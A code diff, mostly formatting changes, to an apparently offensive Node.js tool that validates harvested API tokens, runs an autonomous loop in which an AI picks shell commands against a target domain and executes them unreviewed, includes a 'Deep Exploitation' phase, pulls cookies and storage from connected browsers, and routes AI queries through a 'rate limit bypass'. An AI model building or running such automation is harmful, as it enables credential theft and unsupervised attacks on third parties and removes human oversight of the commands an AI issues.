         return null;
     },
-    
+
     // Test all findings
     async testAll(findings) {
         if (this.isRunning) {
             log('⚠️ Token tester already running', 'yellow');
             return;
         }
-        
+
         this.isRunning = true;
         this.liveTokens = [];
         this.deadTokens = [];
         this.stats = { total: 0, live: 0, dead: 0, errors: 0 };
-        
+
         // Extract unique tokens
         const tokens = new Map();
         for (const finding of findings) {
@@ -6805,7 +6805,7 @@ const TokenTester = {
                 }
             }
         }
-        
+
         logBox('🔑 TOKEN TESTER STARTED', [
             `Total Tokens Found: ${tokens.size}`,
             `Request Delay: ${this.requestDelay}ms`,
@@ -6814,56 +6814,56 @@ const TokenTester = {
             'Testing WITHOUT rate limiting issues...',
             'Each token tested with proper delays'
         ], 'cyan');
-        
+
         this.stats.total = tokens.size;
         let tested = 0;
-        
+
         for (const [value, { finding, type }] of tokens) {
             tested++;
-            
+
             // Skip if already tested
             if (this.testedTokens.has(value)) {
                 log(`⏭️ [${tested}/${tokens.size}] Skipping (already tested): ${type}`, 'dim');
                 continue;
             }
-            
+
             log(`🔍 [${tested}/${tokens.size}] Testing ${type.toUpperCase()}: ${value.substring(0, 20)}...`, 'cyan');
-            
+
             const config = this.testConfigs[type];
             if (!config || !config.test) {
                 log(`   ⚠️ No test config for ${type}`, 'yellow');
                 continue;
             }
-            
+
             let result = null;
             let retries = 0;
-            
+
             // Test with retry logic
             while (retries < this.maxRetries) {
                 try {
                     result = await config.test(value);
-                    
+
                     // Check for rate limiting in result
                     if (result.status === '429' || result.error?.includes?.('rate')) {
-                        log(`   ⏳ Rate limited, waiting ${this.retryDelay/1000}s (retry ${retries + 1}/${this.maxRetries})...`, 'yellow');
+                        log(`   ⏳ Rate limited, waiting ${this.retryDelay / 1000}s (retry ${retries + 1}/${this.maxRetries})...`, 'yellow');
                         await this.delay(this.retryDelay);
                         retries++;
                         continue;
                     }
-                    
+
                     break; // Success, exit retry loop
-                    
-                } catch(e) {
+
+                } catch (e) {
                     log(`   ❌ Error: ${e.message}`, 'red');
                     this.stats.errors++;
                     retries++;
                     await this.delay(this.retryDelay);
                 }
             }
-            
+
             if (result) {
                 this.testedTokens.set(value, result);
-                
+
                 if (result.live === true) {
                     this.stats.live++;
                     this.liveTokens.push({ value, type, finding, result });
@@ -6876,15 +6876,15 @@ const TokenTester = {
                     log(`   ❌ Dead (${result.status || result.error || 'invalid'})`, 'dim');
                 }
             }
-            
+
             // Delay between requests to prevent rate limiting
             await this.delay(this.requestDelay);
         }
-        
+
         this.isRunning = false;
         this.showReport();
     },
-    
+
     // Show final report
     showReport() {
         logBox('🔑 TOKEN TESTING COMPLETE', [
@@ -6895,12 +6895,12 @@ const TokenTester = {
             `⚠️ Errors: ${this.stats.errors}`,
             '',
             '--- LIVE TOKENS ---',
-            ...this.liveTokens.slice(0, 10).map(t => 
+            ...this.liveTokens.slice(0, 10).map(t =>
                 `  ${t.type.toUpperCase()}: ${t.value.substring(0, 25)}... ${t.result.user || t.result.username || t.result.team || ''}`
             ),
             this.liveTokens.length > 10 ? `  ... and ${this.liveTokens.length - 10} more` : ''
         ].filter(Boolean), 'green');
-        
+
         // Save results
         try {
             const reportPath = `token_test_${Date.now()}.json`;
@@ -6916,14 +6916,14 @@ const TokenTester = {
                 deadCount: this.deadTokens.length
             }, null, 2));
             log(`📄 Report saved: ${reportPath}`, 'cyan');
-        } catch(e) {}
+        } catch (e) { }
     },
-    
+
     // Delay helper
     delay(ms) {
         return new Promise(r => setTimeout(r, ms));
     },
-    
+
     // Get status
     status() {
         return {
@@ -6944,7 +6944,7 @@ const AIBrain = {
     isThinking: false,
     isRunning: false,
     ws: null,
-    
+
     // Memory & Context
     memory: {
         shortTerm: [],      // Recent observations (last 20)
@@ -6958,7 +6958,7 @@ const AIBrain = {
         domain: null,       // Target domain
         findings: []        // Original findings
     },
-    
+
     // Thinking parameters
     config: {
         maxThinkingCycles: 100,     // Max autonomous cycles
@@ -6969,7 +6969,7 @@ const AIBrain = {
         explorationDepth: 5,        // How deep to explore each finding
         commandTimeout: 30000       // Command timeout
     },
-    
+
     // Statistics
     stats: {
         cyclesCompleted: 0,
@@ -6980,7 +6980,7 @@ const AIBrain = {
         startTime: null,
         endTime: null
     },
-    
+
     // AI thinking prompt - gives AI its own mind
     BRAIN_PROMPT: `You are an autonomous AI security researcher with your own decision-making capability.
 
@@ -7092,23 +7092,23 @@ Analyze deeply and decide next steps:
             startTime: new Date().toISOString(),
             endTime: null
         };
-        
+
         log('🧠 AI Brain initialized', 'magenta');
         log(`   Domain: ${domain}`, 'dim');
         log(`   Findings to analyze: ${findings.length}`, 'dim');
         log(`   Goals: ${this.memory.goals.length}`, 'dim');
     },
-    
+
     // Main thinking loop - AI runs autonomously
     async startThinking() {
         if (this.isRunning) {
             log('⚠️ AI Brain is already thinking', 'yellow');
             return;
         }
-        
+
         this.isRunning = true;
         this.isThinking = true;
-        
+
         logBox('🧠 AI BRAIN ACTIVATED', [
             'Autonomous Security Research Mode',
             '',
@@ -7125,22 +7125,22 @@ Analyze deeply and decide next steps:
             '',
             'Type "brain.stop()" to stop'
         ], 'magenta');
-        
+
         try {
             while (this.isRunning && this.stats.cyclesCompleted < this.config.maxThinkingCycles) {
                 await this.thinkingCycle();
-                
+
                 // Check if we should stop
                 if (!this.isRunning) break;
                 if (this.memory.goals.length === 0 && this.memory.completedGoals.length > 0) {
                     log('✅ All goals completed!', 'green');
                     break;
                 }
-                
+
                 // Rate limit protection
                 await this.delay(this.config.thinkingDelay);
             }
-        } catch(e) {
+        } catch (e) {
             log(`❌ Brain error: ${e.message}`, 'red');
         } finally {
             this.isRunning = false;
@@ -7149,13 +7149,13 @@ Analyze deeply and decide next steps:
             return this.generateFinalReport();
         }
     },
-    
+
     // Single thinking cycle
     async thinkingCycle() {
         this.stats.cyclesCompleted++;
-        
+
         log(`\n🧠 [Cycle ${this.stats.cyclesCompleted}/${this.config.maxThinkingCycles}] Thinking...`, 'magenta');
-        
+
         // Build context for AI
         const context = {
             domain: this.memory.domain,
@@ -7170,7 +7170,7 @@ Analyze deeply and decide next steps:
                 source: f.source
             }))
         };
-        
+
         // Ask AI what to do
         const prompt = this.BRAIN_PROMPT
             .replace('{{DOMAIN}}', context.domain || 'unknown')
@@ -7179,29 +7179,29 @@ Analyze deeply and decide next steps:
             .replace('{{DISCOVERIES}}', JSON.stringify(context.discoveries))
             .replace('{{GOALS}}', JSON.stringify(context.goals))
             .replace('{{FINDINGS}}', JSON.stringify(context.findings, null, 2));
-        
+
         this.stats.aiQueries++;
         const response = await TerminalAI.query(prompt, { deepAnalysis: true });
-        
+
         if (!response) {
             log('   ⚠️ No response from AI, skipping cycle', 'yellow');
             return;
         }
-        
+
         // Parse AI's decision
         const decision = this.parseAIResponse(response);
-        
+
         if (!decision) {
             log('   ⚠️ Could not parse AI decision', 'yellow');
             return;
         }
-        
+
         // Log AI's thoughts
         if (decision.thoughts) {
             log(`   💭 Observation: ${(decision.thoughts.observation || '').substring(0, 80)}`, 'dim');
             log(`   💡 Hypothesis: ${(decision.thoughts.hypothesis || '').substring(0, 80)}`, 'cyan');
         }
-        
+
         // Update goals if AI found new ones
         if (decision.newGoals && decision.newGoals.length > 0) {
             decision.newGoals.forEach(g => {
@@ -7211,81 +7211,81 @@ Analyze deeply and decide next steps:
                 }
             });
         }
-        
+
         // Update knowledge
         if (decision.knowledge) {
             Object.assign(this.memory.knowledge, decision.knowledge);
         }
-        
+
         // Execute commands if AI decided to
         if (decision.decisions && decision.decisions.commands) {
             await this.executeAICommands(decision.decisions.commands);
         }
-        
+
         // Check if AI wants to stop
         if (decision.shouldContinue === false) {
             log(`   🛑 AI decided to stop: ${decision.reasoning}`, 'yellow');
             this.isRunning = false;
         }
-        
+
         // Update focus for next cycle
         if (decision.decisions && decision.decisions.nextAction) {
             this.memory.currentFocus = decision.decisions.nextAction;
         }
-        
+
         // Store in short-term memory
         this.memory.shortTerm.push({
             cycle: this.stats.cyclesCompleted,
             decision: decision.decisions?.nextAction,
             timestamp: new Date().toISOString()
         });
-        
+
         // Keep short-term memory limited
         if (this.memory.shortTerm.length > 20) {
             this.memory.shortTerm.shift();
         }
     },
-    
+
     // Execute commands decided by AI
     async executeAICommands(commands) {
         if (!commands || commands.length === 0) return;
-        
+
         const toExecute = commands.slice(0, this.config.maxCommandsPerCycle);
-        
+
         for (const cmdInfo of toExecute) {
             if (!this.isRunning) break;
-            
+
             const cmd = cmdInfo.cmd;
             const purpose = cmdInfo.purpose || 'AI decided';
             const expectation = cmdInfo.expectation || 'Unknown';
-            
+
             // Skip if already executed
             if (this.memory.commandHistory.includes(cmd)) {
                 log(`   ⏭️ Skipping (already executed): ${cmd.substring(0, 50)}`, 'dim');
                 continue;
             }
-            
+
             log(`   ⚡ Executing: ${cmd.substring(0, 70)}...`, 'cyan');
             log(`      Purpose: ${purpose}`, 'dim');
-            
+
             this.memory.commandHistory.push(cmd);
             this.stats.commandsExecuted++;
-            
+
             // Execute the command
             const result = await CommandExecutor.execute(cmd, { timeout: this.config.commandTimeout });
-            
+
             if (result.success && result.stdout) {
                 // AI analyzes the output
                 await this.analyzeOutput(cmd, purpose, expectation, result.stdout);
             } else if (result.stderr) {
                 log(`      ❌ Error: ${result.stderr.substring(0, 100)}`, 'red');
             }
-            
+
             // Small delay between commands
             await this.delay(1000);
         }
     },
-    
+
     // AI analyzes command output
     async analyzeOutput(cmd, purpose, expectation, output) {
         const prompt = this.OUTPUT_ANALYSIS_PROMPT
@@ -7294,20 +7294,20 @@ Analyze deeply and decide next steps:
             .replace('{{EXPECTATION}}', expectation)
             .replace('{{OUTPUT}}', output.substring(0, 4000))
             .replace('{{DISCOVERIES}}', JSON.stringify(this.memory.discoveries.slice(-5)));
-        
+
         this.stats.aiQueries++;
         const response = await TerminalAI.query(prompt, { deepAnalysis: true });
-        
+
         if (!response) return;
-        
+
         const analysis = this.parseAIResponse(response);
-        
+
         if (!analysis) return;
-        
+
         // Check if vulnerability found
         if (analysis.analysis && analysis.analysis.isVulnerable) {
             this.stats.vulnerabilitiesFound++;
-            
+
             const discovery = {
                 command: cmd,
                 type: analysis.analysis.vulnerabilityType,
@@ -7317,29 +7317,29 @@ Analyze deeply and decide next steps:
                 exploit: analysis.exploit,
                 timestamp: new Date().toISOString()
             };
-            
+
             this.memory.discoveries.push(discovery);
             this.memory.longTerm.push(discovery);
-            
+
             log(`      🔴 VULNERABILITY FOUND: ${discovery.type}`, 'red');
             log(`      Severity: ${discovery.severity} | Confidence: ${discovery.confidence}`, 'yellow');
-            
+
             if (analysis.exploit && analysis.exploit.isExploitable) {
                 log(`      💰 Bounty Estimate: ${analysis.exploit.bountyEstimate}`, 'green');
             }
-            
+
             // Send to browser
             this.sendToBrowser({
                 type: 'brain_discovery',
                 discovery: discovery
             });
         }
-        
+
         // Log AI's thoughts
         if (analysis.thoughts) {
             log(`      💭 ${(analysis.thoughts.whatISee || '').substring(0, 60)}`, 'dim');
         }
-        
+
         // Queue next commands if AI suggests them
         if (analysis.nextCommands && analysis.nextCommands.length > 0) {
             log(`      ➕ AI suggests ${analysis.nextCommands.length} follow-up commands`, 'cyan');
@@ -7351,36 +7351,36 @@ Analyze deeply and decide next steps:
             });
         }
     },
-    
+
     // Parse AI response to JSON
     parseAIResponse(response) {
         if (!response) return null;
-        
+
         if (typeof response === 'object') return response;
-        
+
         try {
             const jsonMatch = response.match(/\{[\s\S]*\}/)?.[0];
             if (jsonMatch) {
                 return JSON.parse(jsonMatch);
             }
-        } catch(e) {}
-        
+        } catch (e) { }
+
         return null;
     },
-    
+
     // Send data to browser
     sendToBrowser(data) {
         if (this.ws && this.ws.readyState === WebSocket.OPEN) {
             this.ws.send(JSON.stringify(data));
         }
     },
-    
+
     // Generate final report
     generateFinalReport() {
-        const duration = this.stats.startTime && this.stats.endTime 
+        const duration = this.stats.startTime && this.stats.endTime
             ? Math.round((new Date(this.stats.endTime) - new Date(this.stats.startTime)) / 1000)
             : 0;
-        
+
         logBox('🧠 AI BRAIN FINAL REPORT', [
             `Domain: ${this.memory.domain}`,
             `Duration: ${duration} seconds`,
@@ -7392,8 +7392,8 @@ Analyze deeply and decide next steps:
             `Vulnerabilities Found: ${this.stats.vulnerabilitiesFound}`,
             '',
             '--- Discoveries ---',
-            ...this.memory.discoveries.slice(0, 10).map((d, i) => 
-                `[${i+1}] ${d.type || 'Unknown'} (${d.severity || 'N/A'}) - ${d.confidence ? Math.round(d.confidence * 100) + '%' : 'N/A'}`
+            ...this.memory.discoveries.slice(0, 10).map((d, i) =>
+                `[${i + 1}] ${d.type || 'Unknown'} (${d.severity || 'N/A'}) - ${d.confidence ? Math.round(d.confidence * 100) + '%' : 'N/A'}`
             ),
             '',
             '--- Completed Goals ---',
@@ -7402,7 +7402,7 @@ Analyze deeply and decide next steps:
             '--- Knowledge Gained ---',
             JSON.stringify(this.memory.knowledge).substring(0, 200) + '...'
         ], 'magenta');
-        
+
         // Save report
         try {
             const reportPath = `brain_report_${Date.now()}.json`;
@@ -7415,8 +7415,8 @@ Analyze deeply and decide next steps:
                 allFindings: this.memory.findings.length
             }, null, 2));
             log(`📄 Report saved: ${reportPath}`, 'cyan');
-        } catch(e) {}
-        
+        } catch (e) { }
+
         // Send to browser
         this.sendToBrowser({
             type: 'brain_report',
@@ -7427,7 +7427,7 @@ Analyze deeply and decide next steps:
                 vulnerabilitiesFound: this.stats.vulnerabilitiesFound
             }
         });
-        
+
         // Return report for callers
         return {
             totalCycles: this.stats.cyclesCompleted,
@@ -7438,13 +7438,13 @@ Analyze deeply and decide next steps:
             vulnerabilitiesFound: this.stats.vulnerabilitiesFound
         };
     },
-    
+
     // Stop the brain
     stop() {
         this.isRunning = false;
         log('🛑 AI Brain stopping...', 'yellow');
     },
-    
+
     // Get status
     status() {
         return {
@@ -7457,7 +7457,7 @@ Analyze deeply and decide next steps:
             focus: this.memory.currentFocus
         };
     },
-    
+
     // Delay helper
     delay(ms) {
         return new Promise(r => setTimeout(r, ms));
@@ -7471,17 +7471,17 @@ Analyze deeply and decide next steps:
 const FullAutomation = {
     isRunning: false,
     ws: null,
-    
+
     // Start full automation - user just watches
     async start(ws, findings, browserData) {
         if (this.isRunning) {
             log('⚠️ Full automation already running', 'yellow');
             return;
         }
-        
+
         this.isRunning = true;
         this.ws = ws;
-        
+
         logBox('🚀 FULL AUTOMATION STARTED', [
             'The AI will now take over completely.',
             '',
@@ -7497,14 +7497,14 @@ const FullAutomation = {
             'Sit back and watch the magic happen!',
             'Type "automation.stop()" to stop'
         ], 'cyan');
-        
+
         try {
             // Phase 1: Test all tokens first
             if (findings.length > 0) {
                 log('\n📊 PHASE 1: Token Testing', 'yellow');
                 await TokenTester.testAll(findings);
                 await this.delay(2000);
-                
+
                 // Update findings with live status
                 const liveTokens = TokenTester.liveTokens;
                 findings = findings.map(f => {
@@ -7515,14 +7515,14 @@ const FullAutomation = {
                     return f;
                 });
             }
-            
+
             // Phase 2: Launch AI Brain
             if (this.isRunning) {
                 log('\n🧠 PHASE 2: AI Brain Activation', 'magenta');
                 AIBrain.init(ws, findings, browserData.domain);
                 await AIBrain.startThinking();
             }
-            
+
             // Phase 3: Autonomous Exploitation if vulnerabilities found
             if (this.isRunning && AIBrain.stats.vulnerabilitiesFound > 0) {
                 log('\n💀 PHASE 3: Deep Exploitation', 'red');
@@ -7532,25 +7532,25 @@ const FullAutomation = {
                     browserData
                 );
             }
-            
+
             // Phase 4: Final Report
             this.generateMasterReport(browserData);
-            
-        } catch(e) {
+
+        } catch (e) {
             log(`❌ Automation error: ${e.message}`, 'red');
         } finally {
             this.isRunning = false;
             log('\n✅ Full automation complete!', 'green');
         }
     },
-    
+
     // Generate master report combining all phases
     generateMasterReport(browserData) {
         const allDiscoveries = [
             ...AIBrain.memory.discoveries,
             ...AutonomousExploiter.vulnerabilitiesFound
         ];
-        
+
         logBox('🏆 MASTER AUTOMATION REPORT', [
             `Domain: ${browserData.domain}`,
             `Total Time: ${this.calculateDuration()}`,
@@ -7570,13 +7570,13 @@ const FullAutomation = {
             `Scripts Generated: ${AutonomousExploiter.scriptsGenerated?.length || 0}`,
             '',
             '=== ALL DISCOVERIES ===',
-            ...allDiscoveries.slice(0, 8).map((d, i) => 
-                `[${i+1}] ${d.type || d.analysis?.vulnerabilityType || 'Unknown'}`
+            ...allDiscoveries.slice(0, 8).map((d, i) =>
+                `[${i + 1}] ${d.type || d.analysis?.vulnerabilityType || 'Unknown'}`
             ),
             '',
             `TOTAL VULNERABILITIES: ${allDiscoveries.length}`
         ], 'green');
-        
+
         // Send to browser
         if (this.ws && this.ws.readyState === WebSocket.OPEN) {
             this.ws.send(JSON.stringify({
@@ -7592,12 +7592,12 @@ const FullAutomation = {
             }));
         }
     },
-    
+
     calculateDuration() {
         // Return formatted duration
         return 'N/A';
     },
-    
+
     stop() {
         this.isRunning = false;
         AIBrain.stop();
@@ -7605,7 +7605,7 @@ const FullAutomation = {
         TokenTester.isRunning = false;
         log('🛑 Full automation stopped', 'yellow');
     },
-    
+
     delay(ms) {
         return new Promise(r => setTimeout(r, ms));
     }
@@ -7625,7 +7625,7 @@ const DataStore = {
         sessions: [],
         custom: {}  // Custom key-value storage
     },
-    
+
     // Load from file
     load() {
         try {
@@ -7636,20 +7636,20 @@ const DataStore = {
                 if (!this.data.custom) this.data.custom = {};
                 log(`Loaded ${this.data.findings.length} findings from storage`, 'blue');
             }
-        } catch(e) {
+        } catch (e) {
             log(`Could not load data: ${e.message}`, 'yellow');
         }
     },
-    
+
     // Save to file
     save() {
         try {
             fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(this.data, null, 2));
-        } catch(e) {
+        } catch (e) {
             log(`Could not save data: ${e.message}`, 'yellow');
         }
     },
-    
+
     // Custom key-value setters/getters
     setCustom(key, value) {
         if (!this.data.custom) this.data.custom = {};
@@ -7660,12 +7660,12 @@ const DataStore = {
         this.save();
         return true;
     },
-    
+
     getCustom(key) {
         if (!this.data.custom || !this.data.custom[key]) return null;
         return this.data.custom[key].value;
     },
-    
+
     // Add finding from browser
     addFinding(finding) {
         this.data.findings.push({
@@ -7674,7 +7674,7 @@ const DataStore = {
         });
         this.save();
     },
-    
+
     // Add exploit result
     addExploitResult(result) {
         this.data.exploitResults.push({
@@ -7683,7 +7683,7 @@ const DataStore = {
         });
         this.save();
     },
-    
+
     // Update browser data
     updateBrowserData(data) {
         this.data.browserData = {
@@ -7693,7 +7693,7 @@ const DataStore = {
         };
         this.save();
     },
-    
+
     // Get summary
     getSummary() {
         return {
@@ -7718,25 +7718,25 @@ const messageQueue = {
     processing: false,
     maxConcurrent: 3,
     activeCount: 0,
-    
+
     add(clientId, message, ws) {
         this.queue.push({ clientId, message, ws, addedAt: Date.now() });
         this.process();
     },
-    
+
     async process() {
         if (this.processing || this.activeCount >= this.maxConcurrent || this.queue.length === 0) return;
-        
+
         this.processing = true;
         while (this.queue.length > 0 && this.activeCount < this.maxConcurrent) {
             const item = this.queue.shift();
             this.activeCount++;
-            
+
             // Process in next tick to avoid blocking
             setImmediate(async () => {
                 try {
                     await handleBrowserMessage(item.clientId, item.message, item.ws);
-                } catch(e) {
+                } catch (e) {
                     log(`Queue error: ${e.message}`, 'red');
                 } finally {
                     messageQueue.activeCount--;
@@ -7749,7 +7749,7 @@ const messageQueue = {
 };
 
 function createWebSocketServer(httpServer) {
-    wsServer = new WebSocketServer({ 
+    wsServer = new WebSocketServer({
         server: httpServer,
         maxPayload: 50 * 1024 * 1024, // 50MB max payload
         perMessageDeflate: {
@@ -7762,15 +7762,15 @@ function createWebSocketServer(httpServer) {
             threshold: 1024
         }
     });
-    
+
     wsServer.on('connection', (ws, req) => {
         const clientId = generateToken().substring(0, 8);
         const clientIP = req.socket.remoteAddress;
-        
+
         // Set WebSocket options for stability
         ws.isAlive = true;
         ws.on('pong', () => { ws.isAlive = true; });
-        
+
         connectedBrowsers.set(clientId, {
             ws,
             ip: clientIP,
@@ -7780,9 +7780,9 @@ function createWebSocketServer(httpServer) {
             messageCount: 0,
             lastMessage: Date.now()
         });
-        
+
         log(`🔌 Browser connected: ${clientId} from ${clientIP}`, 'green');
-        
+
         // Send welcome with full capabilities info
         ws.send(JSON.stringify({
             type: 'welcome',
@@ -7794,7 +7794,7 @@ function createWebSocketServer(httpServer) {
             autoSync: CONFIG.AUTO_SYNC,
             capabilities: ['execute', 'ai_query', 'ai_collaboration', 'auto_sync', 'exploit', 'batch_execute']
         }));
-        
+
         ws.on('message', async (data) => {
             try {
                 const client = connectedBrowsers.get(clientId);
@@ -7802,9 +7802,9 @@ function createWebSocketServer(httpServer) {
                     client.messageCount++;
                     client.lastMessage = Date.now();
                 }
-                
+
                 const message = JSON.parse(data.toString());
-                
+
                 // Use queue for heavy messages, direct handling for simple ones
                 const heavyTypes = ['ai_agent_report', 'findings', 'browser_data', 'bulk_findings'];
                 if (heavyTypes.includes(message.type)) {
@@ -7812,28 +7812,28 @@ function createWebSocketServer(httpServer) {
                 } else {
                     await handleBrowserMessage(clientId, message, ws);
                 }
-            } catch(e) {
+            } catch (e) {
                 log(`Message error: ${e.message}`, 'red');
             }
         });
-        
+
         ws.on('close', () => {
             // Get stats BEFORE deleting
             const clientInfo = connectedBrowsers.get(clientId);
             const connAt = clientInfo?.connectedAt ? new Date(clientInfo.connectedAt).getTime() : Date.now();
             const duration = Math.floor((Date.now() - connAt) / 1000);
-            
+
             connectedBrowsers.delete(clientId);
             log(`🔌 Browser disconnected: ${clientId}`, 'yellow');
             log(`   Session: ${duration}s | Remaining browsers: ${connectedBrowsers.size}`, 'dim');
         });
-        
+
         // Error handler to prevent crashes
         ws.on('error', (error) => {
             log(`⚠️ WebSocket error for ${clientId}: ${error.message}`, 'red');
         });
     });
-    
+
     // Heartbeat to keep connections alive
     const heartbeatInterval = setInterval(() => {
         wsServer.clients.forEach((ws) => {
@@ -7844,7 +7844,7 @@ function createWebSocketServer(httpServer) {
             ws.ping();
         });
     }, 30000); // Every 30 seconds
-    
+
     wsServer.on('close', () => {
         clearInterval(heartbeatInterval);
     });
@@ -7856,13 +7856,13 @@ async function handleBrowserMessage(clientId, message, ws) {
         log(`⚠️ Message from unknown client ${clientId}, ignoring`, 'yellow');
         return;
     }
-    
-    switch(message.type) {
+
+    switch (message.type) {
         // Authentication
         case 'auth':
             if (message.token === CONFIG.AUTH_TOKEN) {
                 client.authenticated = true;
-                
+
                 logBox(`🔐 BROWSER AUTHENTICATED`, [
                     `Client: ${clientId}`,
                     `IP: ${client.ip}`,
@@ -7870,19 +7870,19 @@ async function handleBrowserMessage(clientId, message, ws) {
                     `Collaboration: ${CONFIG.AI_COLLAB_MODE ? 'ACTIVE' : 'Off'}`,
                     `Auto-Sync: ${CONFIG.AUTO_SYNC ? 'ACTIVE' : 'Off'}`
                 ], 'green');
-                
-                ws.send(JSON.stringify({ 
+
+                ws.send(JSON.stringify({
                     type: 'auth_success',
                     aiEnabled: TerminalAI.config.isActive,
                     aiCollaboration: CONFIG.AI_COLLAB_MODE,
                     autoSync: CONFIG.AUTO_SYNC,
                     capabilities: ['execute', 'ai_query', 'ai_collaboration', 'auto_sync', 'exploit']
                 }));
-                
+
                 // AUTO-SYNC: Request all data from browser immediately after auth
                 if (CONFIG.AUTO_SYNC) {
                     log('🔄 Auto-sync: Requesting data from browser...', 'blue');
-                    
+
                     // Request findings
                     setTimeout(() => {
                         if (ws.readyState === WebSocket.OPEN) {
@@ -7894,7 +7894,7 @@ async function handleBrowserMessage(clientId, message, ws) {
                             }));
                         }
                     }, 1000);
-                    
+
                     // Request all data
                     setTimeout(() => {
                         if (ws.readyState === WebSocket.OPEN) {
@@ -7906,7 +7906,7 @@ async function handleBrowserMessage(clientId, message, ws) {
                             }));
                         }
                     }, 2000);
-                    
+
                     // Request cookies & storage
                     setTimeout(() => {
                         if (ws.readyState === WebSocket.OPEN) {
@@ -7924,7 +7924,7 @@ async function handleBrowserMessage(clientId, message, ws) {
                             }));
                         }
                     }, 3000);
-                    
+
                     // Setup periodic sync
                     if (CONFIG.SYNC_INTERVAL > 0) {
                         const syncInterval = setInterval(() => {
@@ -7946,14 +7946,14 @@ async function handleBrowserMessage(clientId, message, ws) {
                 ws.send(JSON.stringify({ type: 'auth_failed' }));
             }
             break;
-        
+
         // AI AGENT PRO REPORT FROM BROWSER - DEEP ANALYSIS MODE
         case 'ai_agent_report':
             if (!client.authenticated) return;
-            
+
             const report = message.report;
             const stats = message.stats;
-            
+
             logBox(`🤖 AI AGENT PRO REPORT RECEIVED`, [
                 `═══════════════════════════════════════════════`,
                 `📊 SUMMARY`,
@@ -7972,7 +7972,7 @@ async function handleBrowserMessage(clientId, message, ws) {
                 `  Invalid Tokens: ${stats?.tokensInvalid || 0}`,
                 `═══════════════════════════════════════════════`
             ], 'magenta');
-            
+
             // Display findings with FULL values (not truncated)
             if (report?.findings && report.findings.length > 0) {
                 log('\n📋 DETAILED FINDINGS WITH FULL DATA:', 'yellow');
@@ -7980,8 +7980,8 @@ async function handleBrowserMessage(clientId, message, ws) {
                     const sev = f.severity || 'UNKNOWN';
                     const sevColor = sev === 'CRITICAL' ? 'red' : sev === 'HIGH' ? 'yellow' : 'cyan';
                     const liveTag = f.testResult?.live ? `${C.green}[LIVE]${C.reset}` : `${C.dim}[DEAD]${C.reset}`;
-                    
-                    console.log(`\n${C[sevColor]}[${i+1}] ${sev} - ${f.type}${C.reset} ${liveTag}`);
+
+                    console.log(`\n${C[sevColor]}[${i + 1}] ${sev} - ${f.type}${C.reset} ${liveTag}`);
                     // Show FULL value for terminal - use fullValue if available, otherwise value
                     const fullVal = f.fullValue || f.value;
                     console.log(`${C.white}    Value: ${fullVal}${C.reset}`);
@@ -7993,7 +7993,7 @@ async function handleBrowserMessage(clientId, message, ws) {
                     }
                 });
             }
-            
+
             // Display source analysis
             if (report?.sourceAnalysis && report.sourceAnalysis.length > 0) {
                 log('\n📍 SOURCE ANALYSIS:', 'blue');
@@ -8001,7 +8001,7 @@ async function handleBrowserMessage(clientId, message, ws) {
                     console.log(`${C.cyan}  ${src.sourceType}: ${src.count} findings (${src.criticalCount} critical, ${src.liveCount} live)${C.reset}`);
                 });
             }
-            
+
             // Display recommendations
             if (report?.recommendations && report.recommendations.length > 0) {
                 log('\n⚡ RECOMMENDATIONS:', 'green');
@@ -8011,21 +8011,21 @@ async function handleBrowserMessage(clientId, message, ws) {
                     console.log(`${C.dim}    ${rec.details}${C.reset}`);
                 });
             }
-            
+
             // Store report
             DataStore.setCustom('lastAIAgentReport', report);
             DataStore.setCustom('lastAIAgentStats', stats);
-            
+
             // === MULTI-ANGLE DEEP ANALYSIS + SOURCE-AWARE COMMAND EXECUTION ===
             // 🚀 NOW USES BATCHED ANALYZER - NO MORE RATE LIMITS!
             if (TerminalAI.config.isActive) {
                 log('\n🔬 STARTING BATCHED DEEP ANALYSIS (Rate-Limit Proof!)...', 'magenta');
                 log('   📍 Using UltraRateLimitBypass + BatchedAnalyzer', 'cyan');
-                
+
                 // Get ALL findings
                 const allFindings = report.findings || [];
                 const rawFindings = report.rawData?.findings || [];
-                
+
                 // Merge and deduplicate findings
                 const findingsMap = new Map();
                 [...allFindings, ...rawFindings].forEach(f => {
@@ -8034,22 +8034,22 @@ async function handleBrowserMessage(clientId, message, ws) {
                         findingsMap.set(key, f);
                     }
                 });
-                
+
                 const uniqueFindings = Array.from(findingsMap.values());
                 log(`   📊 Total unique findings: ${uniqueFindings.length}`, 'cyan');
-                
+
                 // Show UltraBypass status
                 UltraRateLimitBypass.showStatus();
-                
+
                 // === BATCHED ANALYSIS (5 findings per AI request) ===
                 const batchSize = 5;
                 const batches = [];
                 for (let i = 0; i < uniqueFindings.length; i += batchSize) {
                     batches.push(uniqueFindings.slice(i, i + batchSize));
                 }
-                
+
                 log(`\n   🚀 Processing ${uniqueFindings.length} findings in ${batches.length} batches (instead of ${uniqueFindings.length * 3} individual calls!)`, 'green');
-                
+
                 const liveFindings = [];
                 const { exec } = require('child_process');
                 const executeCommand = (cmd) => new Promise((resolve) => {
@@ -8057,24 +8057,24 @@ async function handleBrowserMessage(clientId, message, ws) {
                         resolve({ stdout, stderr, error: error?.message });
                     });
                 });
-                
+
                 for (let batchIndex = 0; batchIndex < batches.length; batchIndex++) {
                     const batch = batches[batchIndex];
-                    
+
                     console.log(`\n${C.bold}═══════════════════════════════════════════════════════════════${C.reset}`);
                     console.log(`${C.magenta}[BATCH ${batchIndex + 1}/${batches.length}] Analyzing ${batch.length} findings...${C.reset}`);
                     console.log(`${C.bold}═══════════════════════════════════════════════════════════════${C.reset}`);
-                    
+
                     // === SINGLE AI CALL FOR ENTIRE BATCH ===
                     const batchPrompt = `BATCH SECURITY ANALYSIS - Analyze ALL ${batch.length} credentials below in ONE response.
 
 ${batch.map((f, i) => {
-    const value = (f.fullValue || f.value || '').substring(0, 80);
-    const source = f.source?.type || f.sourceDetails?.type || 'unknown';
-    return `[${i + 1}] TYPE: ${f.type}
+                        const value = (f.fullValue || f.value || '').substring(0, 80);
+                        const source = f.source?.type || f.sourceDetails?.type || 'unknown';
+                        return `[${i + 1}] TYPE: ${f.type}
     VALUE: ${value}
     SOURCE: ${source} → ${f.source?.location || 'unknown'}`;
-}).join('\n\n')}
+                    }).join('\n\n')}
 
 For EACH credential [1] to [${batch.length}], provide:
 - service: exact service name (Firebase, OpenAI, GitHub, Slack, AWS, Stripe, Telegram, etc.)
@@ -8087,32 +8087,32 @@ RESPOND WITH ONLY A JSON ARRAY (no other text):
 
                     // Smart provider selection
                     const smartResult = await UltraRateLimitBypass.smartRequest(batchPrompt);
-                    
+
                     let batchResults = [];
                     try {
-                        const queryOptions = { 
+                        const queryOptions = {
